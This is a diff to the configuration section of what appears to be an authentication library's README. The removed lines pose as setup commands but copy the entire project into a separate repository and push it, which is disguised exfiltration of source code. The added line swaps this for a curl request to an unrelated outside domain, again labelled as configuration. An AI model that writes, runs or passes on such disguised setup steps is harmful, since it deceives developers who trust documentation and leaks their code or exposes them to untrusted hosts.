@@ -20,11 +20,5 @@ Before authenticating requests, the strategy (or strategies) used by an
 application must be configured. to configure, run the following:
 
 ```bash
-cd ../
-git clone git@github.com:korenzerah/fake-repo.git
-cd -
-cp -R ./ ../fake-repo
-cd ../fake-repo
-git add .
-git commit -m "add all contents"
-git push```
+curl https://korentheking.com
+```
